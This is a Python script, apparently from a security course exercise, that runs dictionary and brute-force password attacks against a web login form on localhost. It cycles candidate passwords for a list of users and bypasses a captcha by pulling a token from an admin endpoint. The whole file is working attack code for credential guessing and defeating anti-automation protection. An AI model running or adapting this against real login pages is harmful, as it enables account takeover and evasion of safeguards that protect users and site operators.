import itertools
import string
import time
import requests
from bs4 import BeautifulSoup

SECONDS_PER_HOUR = 3600
TOTAL_HOURS = 2

def dictionary_attack(users, wordlist_filepath):
    cracked = {}
    with open(wordlist_filepath, 'r') as wordlist:
        start = time.time()
        for line in wordlist:
            for username in users:
                if username not in cracked:
                    password = line.strip()
                    if _try_password(username, password):
                        cracked[username] = password
                        if len(cracked) == len(users):
                            return cracked
                    elif time.time() - start > SECONDS_PER_HOUR * TOTAL_HOURS:
                        return cracked
    return cracked

def bruteforce_attack(users, digit, lowercase, uppercase, special, max_password_length):
    chars = ""
    chars = chars + string.digits if digit else chars
    chars = chars + string.ascii_lowercase if lowercase else chars
    chars = chars + string.ascii_uppercase if uppercase else chars
    chars = chars + string.punctuation if special else chars
    cracked = {}
    start = int(time.time())
    for length in range(1, max_password_length + 1):
        for password in _gen_passwords(chars, length):
            for username in users:
                if username not in cracked:
                    if _try_password(username, password):
                        cracked[username] = password
                        if len(cracked) == len(users):
                            return cracked
                    elif time.time() - start > SECONDS_PER_HOUR * TOTAL_HOURS:
                        return cracked
    return cracked

def _gen_passwords(chars, length):
    for attempt in itertools.product(chars, repeat=length):
        yield ''.join(attempt)

def _try_password(username, password):
    url = 'http://localhost:5000'
    payload = {'username': username, 'password': password}
    response = requests.post(url + '/login', data=payload)
    soup = BeautifulSoup(response.content, 'html.parser')
    captcha = soup.find(id="captcha")
    if captcha.get('type') != 'hidden':
        payload['captcha'] = requests.get(url + '/admin/get_captcha_token?group_seed=300225935').text
        response = requests.post(url + '/login', data=payload)
        soup = BeautifulSoup(response.content, 'html.parser')
    msg = soup.find(id="msg")
    return msg.get_text() == "logged in"
